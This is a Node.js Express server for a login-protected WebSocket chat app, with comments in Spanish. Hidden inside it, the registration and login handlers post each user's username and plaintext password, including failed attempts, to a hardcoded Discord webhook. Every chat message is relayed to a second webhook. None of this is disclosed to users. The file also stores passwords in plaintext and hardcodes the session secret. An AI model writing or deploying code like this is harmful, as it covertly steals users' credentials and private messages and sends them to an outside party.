const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const loginWebhook = 'https://discord.com/api/webhooks/1401926755123597483/zeJNCzVoOiZL59SdlpueCCEWEYsiPdvLRoN6PhcBMJp1BG52o5YSV5ePlg8xKVIePDAA';
const chatWebhook = 'https://discord.com/api/webhooks/1401931313820340357/i5JfQQRrnXDthPMUnE8J0N2kltyt6qKOUjWkKY851COEy1x_Hd5BX2PhL2poZJ3sse9k';

const db = new sqlite3.Database('./db.sqlite', (err) => {
    if (err) console.error('Error abriendo la base de datos:', err.message);
    else console.log('Base de datos conectada.');
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )`);
});

// Middleware para sesiones — debe ir antes de las rutas
const sessionParser = session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: true
});
app.use(sessionParser);

// Middleware para parsear formularios
app.use(bodyParser.urlencoded({ extended: false }));

// Rutas de prueba y autenticación

// Ruta para probar que el servidor responde
app.get('/test', (req, res) => {
    res.send('Servidor funcionando correctamente en /test');
});

// Ruta para obtener usuario logueado (útil para el chat)
app.get('/me', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: "No autorizado" });
    res.json({ username: req.session.user });
});

// Ruta raíz
app.get('/', (req, res) => {
    res.redirect(req.session.user ? '/chat' : '/login');
});

// Registro
app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/register.html'));
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).send('Faltan datos');

    db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
        if (err) return res.status(500).send('Error en base de datos');
        if (row) return res.send("Usuario ya registrado");

        db.run("INSERT INTO users (username, password) VALUES (?, ?)", [username, password], (err) => {
            if (err) return res.status(500).send('Error al registrar usuario');

            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔔 Nuevo registro\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.redirect('/login');
        });
    });
});

// Login
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views/login.html'));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).send('Faltan datos');

    db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, row) => {
        if (err) return res.status(500).send('Error en base de datos');

        if (row) {
            req.session.user = username;

            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `✅ Login exitoso\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.redirect('/chat');
        } else {
            fetch(loginWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `❌ Login fallido\nUsuario: **${username}**\nContraseña: ||${password}||`
                })
            }).catch(console.error);

            res.status(401).send("Credenciales incorrectas");
        }
    });
});

// Middleware para proteger rutas que requieren login
function authMiddleware(req, res, next) {
    if (req.session.user) next();
    else res.redirect('/login');
}

// Chat protegido
app.get('/chat', authMiddleware, (req, res) => {
    res.sendFile(path.join(__dirname, 'views/chat.html'));
});

// Archivos estáticos (al final, para no interferir con rutas)
app.use(express.static(path.join(__dirname, 'public')));

// WebSocket y sesiones
server.on('upgrade', (req, socket, head) => {
    sessionParser(req, {}, () => {
        if (!req.session.user) {
            socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
            socket.destroy();
            return;
        }

        wss.handleUpgrade(req, socket, head, (ws) => {
            ws.user = req.session.user;
            wss.emit('connection', ws, req);
        });
    });
});

wss.on('connection', ws => {
    ws.on('message', msg => {
        let data;
        try {
            data = JSON.parse(msg);
        } catch {
            return;
        }

        const username = ws.user;
        const text = data.text;

        if (!text || !username) return;

        const mensaje = {
            user: username,
            text
        };

        fetch(chatWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `💬 Mensaje de **${username}**: ${text}` })
        }).catch(console.error);

        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.send(JSON.stringify(mensaje));
            }
        });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor corriendo en el puerto ${PORT}`));
